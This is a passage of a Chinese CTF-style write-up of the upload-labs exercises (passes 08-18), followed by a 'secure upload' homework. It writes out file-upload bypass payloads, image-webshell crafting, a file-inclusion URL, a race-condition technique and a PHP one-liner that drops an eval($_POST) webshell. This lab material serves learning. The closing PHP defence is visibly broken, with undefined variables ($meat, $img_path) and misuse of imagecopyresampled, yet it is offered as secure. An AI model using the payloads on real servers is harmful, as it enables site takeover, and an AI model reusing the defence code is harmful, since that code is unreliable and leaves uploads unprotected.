+<h3 id="pass-08"><a href="#pass-08" class="headerlink" title="pass-08"></a>pass-08</h3><p>因为这里又是随机重命名，然后后缀名取得是处理后的字符串，所以又可以回到::$DATA绕过。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716213324517.png" alt="image-20200716213324517"></p>
+<h3 id="pass-09"><a href="#pass-09" class="headerlink" title="pass-09"></a>pass-09</h3><p>存储的文件名是上传名去<code>.</code>过后的，但是验证还要过滤掉一个空格，又结合前面忽略最后的<code>.</code>构造payload。（向大佬低头，没想出来）</p>
+<p><code>filename=&quot;shell08.php. .&quot;</code></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716223751307.png" alt="image-20200716223751307"></p>
+<h3 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h3><p>过滤php等关键字，由xss的思路，双写绕过。</p>
+<p><code>filename=&quot;shell10.phphpp&quot;</code></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716224345049.png" alt="image-20200716224345049"></p>
+<h3 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h3><p>虽然我也想到了%00字符截断，但是没有想起来%00会自动转码，而直接在burp里改hex会导致服务器报错。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716232433594.png" alt="image-20200716232433594"></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716232619081.png" alt="image-20200716232619081"></p>
+<h3 id="pass-12"><a href="#pass-12" class="headerlink" title="pass-12"></a>pass-12</h3><p>承接pass-11，由于这里save_path是POST过去的，所以需要在burp里面改hex。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716233256871.png" alt="image-20200716233256871"></p>
+<h3 id="pass-13"><a href="#pass-13" class="headerlink" title="pass-13"></a>pass-13</h3><p>先上传个图片马上去，因为只会检查文件的前两个字节，所以把前两个字节改成相应文件的格式头就好。<br>下一步是利用文件包含漏洞，利用upload-labs/include.php来解析刚刚上传的图片马。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200717102154922.png" alt="image-20200717102154922"></p>
+<p>虽然刚刚上传的xxx.jpg是个”图片“，但是通过include.php的文件包含include 来解析时会按照php来解析。<br>[准确来说是按照服务器当前脚本语言来解析，文件包含机制是为了更好地支持代码重用]<br>虽然文件的内容并不是以&lt;?php开头，但是php会默认丢弃不规范的内容，从&lt;?php开始解析。</p>
+<p>于是有payload=<code>/upload-labs/include.php?file=./upload/5120200717095119.jpg</code></p>
+<p><strong>如果</strong>php开启了allow_url_include还可以直接在url中用php伪协议直接包含刚刚上传的图片马。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200717103529716.png" alt="image-20200717103529716"></p>
+<h3 id="pass-14"><a href="#pass-14" class="headerlink" title="pass-14"></a>pass-14</h3><p><code>cmd&gt;copy image.png/b + shell.php/a shell.png</code></p>
+<p>传是传上去了，也绕过了检测，但是文件包含之后不能解析，老是报错。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200717143714809.png" alt="image-20200717143714809"></p>
+<p><strong>破案</strong>：大概是图片有点儿大，里面有些神奇字符破坏了php的解析。重新做一个小一点儿图片马就过了。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200717143646731.png" alt="image-20200717143646731"></p>
+<h3 id="pass-15"><a href="#pass-15" class="headerlink" title="pass-15"></a>pass-15</h3><p>继续用pass-14的图片马，记得现在服务器的PHPstudy里把ph_exif开关打开。</p>
+<p>依然不能解析利用。[解决方法同上]</p>
+<h3 id="pass-16"><a href="#pass-16" class="headerlink" title="pass-16"></a>pass-16</h3><p>二次渲染</p>
+<h3 id="pass-17"><a href="#pass-17" class="headerlink" title="pass-17"></a>pass-17</h3><p>直接上传shell.php改后缀名，然后文件包含。</p>
+<h3 id="pass-18"><a href="#pass-18" class="headerlink" title="pass-18"></a>pass-18</h3><p>条件竞争</p>
+<p>需要注意的是文件上传之后先以原文件名存储，然后再基于时间随机命名。<br>在存储之后到重命名之前，刚刚上传的文件是可以被我们主动访问到的（只要我们访问的时间足够巧）。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200717162914017.png" alt="image-20200717162914017"></p>
+<p>那么就在这个图片里写个马儿，用这个马儿生成另外一个马儿供长期访问（不被重命名）。<br>写个python不断请求include.php去解析上传的图片希望能够生成马儿，因为时机稍纵即逝，所以上传图片这边也需要用Burp不断重发(手动还是自动intruder视环境而定)。一旦include.php解析图片成功，那么就可以访问生成的马儿了。</p>
+<p><code>&lt;?php fputs(fopen(&#39;shell2.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;x&quot;])?&gt;&#39;);?&gt;</code></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200717162713518.png" alt="image-20200717162713518"></p>
+<h3 id="other"><a href="#other" class="headerlink" title="other"></a>other</h3><p>利用临时文件。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linuxsec/articles/11278477.html">https://www.cnblogs.com/linuxsec/articles/11278477.html</a></p>
+<p>虽然temp临时文件会在程序结束之后被删除，但是谁说程序总能正常结束呢？<br>使用文件包含功能不断地自我包含会导致php异常退出来处理错误，于是没有去删除临时文件，可以通过暴力猜测文件名访问到文件。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200718150214528.png" alt="image-20200718150214528"></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200718145457471.png" alt="image-20200718145457471"></p>
+<h3 id="课后作业：安全文件上传"><a href="#课后作业：安全文件上传" class="headerlink" title="课后作业：安全文件上传"></a>课后作业：安全文件上传</h3><p>这里通过两种手段尝试实现文件上传过程中的防御。</p>
+<h4 id="白名单-随机重命名"><a href="#白名单-随机重命名" class="headerlink" title="白名单+随机重命名"></a>白名单+随机重命名</h4><p>文件的存储路径已经通过预定义的方式被系统控制，然后通过随机重命名控制文件的名称，最后基于白名单严格控制文件的扩展名。<br>在没有文件包含或者.htaccess解析漏洞的前提下，文件上传是安全的。</p>
+<h4 id="重采样-头部元数据检测"><a href="#重采样-头部元数据检测" class="headerlink" title="重采样+头部元数据检测"></a>重采样+头部元数据检测</h4><p>在存在文件包含或者.htaccess解析漏洞时，第一个方法可以被图片马绕过。<br>图片马攻击成功的本质是图片二进制数据包含php语句且该图片以php格式被解析，由于预设已经存在解析漏洞，那么只能在php语句检测上想办法。<br>利用php-GD扩展的imageCopyResampled()通过像素插值算法修改图片元数据，可以破坏php语句。但是这还不够，因为图片数据中往往存在一部分辅助数据不受重采样的影响，而php语句可以被注入到这些辅助数据块中免于被破环。<br>于是，可以通过检测辅助数据块的方式检测其中的php语句。辅助数据快往往存在于文件流的头部且长度较小，虽然从格式标准而言辅助数据块可以很长，但是一般情况下是较短的，如果被恶意构造得很长，可以武断地判为恶意图片。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_name</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$t</span>=time();</span><br><span class="line">    <span class="variable">$new_name</span>=date(<span class="string">&quot;Ymd&quot;</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$allchar</span> = <span class="string">&quot;abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span> ; </span><br><span class="line">    srand(mktime());</span><br><span class="line">    <span class="keyword">for</span>( <span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;=<span class="number">8</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$new_name</span>.=substr(<span class="variable">$allchar</span>,rand()%<span class="number">52</span>,<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$new_name</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getExt</span>(<span class="params"><span class="variable">$orign_file_name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ext</span>=strrchr(<span class="variable">$orign_file_name</span>,<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    <span class="variable">$ext</span>=trim(<span class="variable">$ext</span>);</span><br><span class="line">    <span class="variable">$ext</span>=strtolower(<span class="variable">$ext</span>);</span><br><span class="line">    <span class="variable">$white_list</span>=<span class="keyword">array</span>(<span class="string">&quot;.jpg&quot;</span>,<span class="string">&quot;.png&quot;</span>,<span class="string">&quot;.jpeg&quot;</span>,<span class="string">&quot;.pdf&quot;</span>,<span class="string">&quot;.doc&quot;</span>,<span class="string">&quot;.docx&quot;</span>,<span class="string">&quot;.md&quot;</span>,<span class="string">&quot;.txt&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,<span class="string">&quot;.pttx&quot;</span>,<span class="string">&quot;.xls&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>,<span class="variable">$white_list</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;unknown&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reCodeImg</span>(<span class="params"><span class="variable">$tmpImg</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//我们在这里针对性地检查图片马，具体使用重采样和固定元数据内容敏感检测结合的方法</span></span><br><span class="line">	<span class="comment">//首先重采样，破坏图片内容中的shell语句</span></span><br><span class="line">	<span class="variable">$newTmpImg</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$x</span>=imagesx(<span class="variable">$tmpImg</span>);</span><br><span class="line">	<span class="variable">$y</span>=imagesy(<span class="variable">$tmpImg</span>);</span><br><span class="line">	imagecopyresampled(<span class="variable">$newTmpImg</span>, <span class="variable">$tmpImg</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="variable">$x</span>, <span class="variable">$y</span>, <span class="variable">$x</span>, <span class="variable">$y</span>);</span><br><span class="line">	<span class="variable">$handler</span>=fopen(<span class="variable">$newTmpImg</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="variable">$metadata</span>=fread(<span class="variable">$handler</span>,<span class="number">2048</span>);</span><br><span class="line">	<span class="keyword">if</span>(!strrpos(<span class="variable">$meat</span>,<span class="string">&quot;IDAT&quot;</span>) <span class="keyword">or</span> strripos(<span class="variable">$metadata</span>, <span class="string">&quot;php&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;Error&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$newTmpImg</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!is_uploaded_file(<span class="variable">$temp_file</span>))&#123;</span><br><span class="line">        	<span class="variable">$msg</span>=<span class="string">&quot;上传错误！&quot;</span>;</span><br><span class="line">        	<span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$new_file_name</span>=random_name();</span><br><span class="line">        <span class="variable">$new_file_ext</span> =getExt(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$new_file_ext</span>==<span class="string">&quot;unknown&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$msg</span>=<span class="string">&quot;未知图片类型，不能上传&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        	<span class="keyword">if</span>(in_array(<span class="variable">$new_file_ext</span>, <span class="keyword">array</span>(<span class="string">&quot;.jpg&quot;</span>,<span class="string">&quot;.png&quot;</span>,<span class="string">&quot;.jpeg&quot;</span>)))&#123;<span class="comment">//针对性地检查图片文件</span></span><br><span class="line">        		<span class="variable">$temp_file</span>=reCodeImg(<span class="variable">$temp_file</span>);</span><br><span class="line">        		<span class="keyword">if</span>(<span class="variable">$temp_file</span>==<span class="string">&quot;Error&quot;</span>)&#123;</span><br><span class="line">        			<span class="variable">$msg</span>=<span class="string">&quot;检测到恶意语句&quot;</span>;</span><br><span class="line">        			<span class="keyword">return</span> ;</span><br><span class="line">        		&#125;</span><br><span class="line">        	&#125;</span><br><span class="line">            <span class="variable">$new_file_path</span>= UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$new_file_name</span> . <span class="variable">$new_file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>))&#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/10/18/ADWorld-Mobile-Easy/" rel="prev" title="Easy Mobile of ADWorld">
+      <i class="fa fa-chevron-left"></i> Easy Mobile of ADWorld
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/12/01/Android-Reverse-1/" rel="next" title="几个Android逆向">
+      几个Android逆向 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          見出し
+        </li>
+        <li class="sidebar-nav-overview">
+          概要
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-Lab"><span class="nav-number">1.</span> <span class="nav-text">SQL-Lab</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BB%93%E6%9E%84"><span class="nav-number">1.1.</span> <span class="nav-text">数据库结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-1"><span class="nav-number">1.2.</span> <span class="nav-text">Less-1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-number">1.2.1.</span> <span class="nav-text">检查是否存在注入点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="nav-number">1.2.2.</span> <span class="nav-text">检查关键字过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE"><span class="nav-number">1.2.3.</span> <span class="nav-text">判断回显</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E5%87%BA%E7%9B%B8%E5%85%B3%E5%8F%82%E6%95%B0"><span class="nav-number">1.2.4.</span> <span class="nav-text">查出相关参数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5information-schema"><span class="nav-number">1.2.5.</span> <span class="nav-text">查information_schema</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%B9%E6%8D%AE%E5%BE%97%E5%88%B0%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E6%9F%A5%E8%A1%A8%E5%92%8C%E5%88%97"><span class="nav-number">1.2.6.</span> <span class="nav-text">根据得到的数据库名查表和列</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8B%BF%E5%88%B0security%E4%B8%8B%E7%9A%84%E6%89%80%E6%9C%89%E8%A1%A8"><span class="nav-number">1.2.7.</span> <span class="nav-text">拿到security下的所有表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%A7%E7%BB%AD%E6%9F%A5%E8%A1%A8"><span class="nav-number">1.2.8.</span> <span class="nav-text">继续查表</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-2"><span class="nav-number">1.3.</span> <span class="nav-text">Less-2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-3"><span class="nav-number">1.4.</span> <span class="nav-text">Less-3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-4"><span class="nav-number">1.5.</span> <span class="nav-text">Less-4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-5-%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5"><span class="nav-number">1.6.</span> <span class="nav-text">Less-5 布尔注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-6"><span class="nav-number">1.7.</span> <span class="nav-text">Less-6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-7"><span class="nav-number">1.8.</span> <span class="nav-text">Less-7</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-8"><span class="nav-number">1.9.</span> <span class="nav-text">Less-8</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-9"><span class="nav-number">1.10.</span> <span class="nav-text">Less-9</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-10"><span class="nav-number">1.11.</span> <span class="nav-text">Less-10</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-11"><span class="nav-number">1.12.</span> <span class="nav-text">Less-11</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-12"><span class="nav-number">1.13.</span> <span class="nav-text">Less-12</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-13"><span class="nav-number">1.14.</span> <span class="nav-text">Less-13</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-14"><span class="nav-number">1.15.</span> <span class="nav-text">Less-14</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-15"><span class="nav-number">1.16.</span> <span class="nav-text">Less-15</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-16"><span class="nav-number">1.17.</span> <span class="nav-text">Less-16</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-17"><span class="nav-number">1.18.</span> <span class="nav-text">Less-17</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-18"><span class="nav-number">1.19.</span> <span class="nav-text">Less-18</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-19"><span class="nav-number">1.20.</span> <span class="nav-text">Less-19</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-20"><span class="nav-number">1.21.</span> <span class="nav-text">Less-20</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQLmap"><span class="nav-number">1.22.</span> <span class="nav-text">SQLmap</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-Lab"><span class="nav-number">2.</span> <span class="nav-text">XSS-Lab</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#level1"><span class="nav-number">2.1.</span> <span class="nav-text">level1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level2"><span class="nav-number">2.2.</span> <span class="nav-text">level2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level3"><span class="nav-number">2.3.</span> <span class="nav-text">level3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level4"><span class="nav-number">2.4.</span> <span class="nav-text">level4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level5"><span class="nav-number">2.5.</span> <span class="nav-text">level5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level6"><span class="nav-number">2.6.</span> <span class="nav-text">level6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level7"><span class="nav-number">2.7.</span> <span class="nav-text">level7</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level8"><span class="nav-number">2.8.</span> <span class="nav-text">level8</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level9"><span class="nav-number">2.9.</span> <span class="nav-text">level9</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level10"><span class="nav-number">2.10.</span> <span class="nav-text">level10</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level11"><span class="nav-number">2.11.</span> <span class="nav-text">level11</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level12"><span class="nav-number">2.12.</span> <span class="nav-text">level12</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level13"><span class="nav-number">2.13.</span> <span class="nav-text">level13</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level14%E2%80%93"><span class="nav-number">2.14.</span> <span class="nav-text">level14–</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level15%E2%80%93"><span class="nav-number">2.15.</span> <span class="nav-text">level15–</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level16"><span class="nav-number">2.16.</span> <span class="nav-text">level16</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level17"><span class="nav-number">2.17.</span> <span class="nav-text">level17</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level18"><span class="nav-number">2.18.</span> <span class="nav-text">level18</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level19"><span class="nav-number">2.19.</span> <span class="nav-text">level19</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level20"><span class="nav-number">2.20.</span> <span class="nav-text">level20</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Upload-Lab"><span class="nav-number">3.</span> <span class="nav-text">Upload-Lab</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">3.1.</span> <span class="nav-text">参考文章</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-01"><span class="nav-number">3.2.</span> <span class="nav-text">pass-01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-02"><span class="nav-number">3.3.</span> <span class="nav-text">pass-02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-03"><span class="nav-number">3.4.</span> <span class="nav-text">pass-03</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-04"><span class="nav-number">3.5.</span> <span class="nav-text">pass-04</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-05"><span class="nav-number">3.6.</span> <span class="nav-text">pass-05</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-06"><span class="nav-number">3.7.</span> <span class="nav-text">pass-06</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-07"><span class="nav-number">3.8.</span> <span class="nav-text">pass-07</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-08"><span class="nav-number">3.9.</span> <span class="nav-text">pass-08</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-09"><span class="nav-number">3.10.</span> <span class="nav-text">pass-09</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-10"><span class="nav-number">3.11.</span> <span class="nav-text">pass-10</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-11"><span class="nav-number">3.12.</span> <span class="nav-text">pass-11</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-12"><span class="nav-number">3.13.</span> <span class="nav-text">pass-12</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-13"><span class="nav-number">3.14.</span> <span class="nav-text">pass-13</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-14"><span class="nav-number">3.15.</span> <span class="nav-text">pass-14</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-15"><span class="nav-number">3.16.</span> <span class="nav-text">pass-15</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-16"><span class="nav-number">3.17.</span> <span class="nav-text">pass-16</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-17"><span class="nav-number">3.18.</span> <span class="nav-text">pass-17</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-18"><span class="nav-number">3.19.</span> <span class="nav-text">pass-18</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#other"><span class="nav-number">3.20.</span> <span class="nav-text">other</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9A%EF%BC%9A%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">3.21.</span> <span class="nav-text">课后作业：安全文件上传</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%99%BD%E5%90%8D%E5%8D%95-%E9%9A%8F%E6%9C%BA%E9%87%8D%E5%91%BD%E5%90%8D"><span class="nav-number">3.21.1.</span> <span 